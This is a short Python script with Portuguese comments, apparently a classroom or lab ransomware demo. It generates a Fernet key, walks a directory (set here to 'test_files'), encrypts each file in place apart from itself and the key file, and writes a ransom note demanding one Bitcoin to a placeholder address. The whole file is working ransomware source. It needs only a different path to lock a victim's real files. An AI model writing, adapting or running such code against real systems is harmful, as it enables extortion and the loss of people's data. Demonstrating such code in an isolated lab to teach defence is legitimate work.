from cryptography.fernet import Fernet
import os

# 1 Gerar Chave para criptografia e descriptografia


def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as arquivo_chave:
        arquivo_chave.write(chave)

# 2 Carregar a chave previamente gerada


def carregar_chave():
    return open("chave.key", "rb").read()

# 3 Criptografar um arquivo


def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

# 4 Encontrar e listar todos os arquivos em um diretório


def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for arquivo in arquivos:
            caminho = os.path.join(raiz, arquivo)
            if arquivo != "ransomware.py" and not arquivo.endswith(".key"):
                lista.append(caminho)
    return lista

# 5 Criar mensagem de resgate para o usuário


def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! \n")
        f.write("Envie 1 Bitcoin para o seguinte endereço: \n")
        f.write("1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q \n")
        f.write("Depois enviaremos a chave para recuperar os dados. \n")

# 6 Execução principal


def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")

    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado. Todos os arquivos foram criptografados.")


if __name__ == "__main__":
    main()
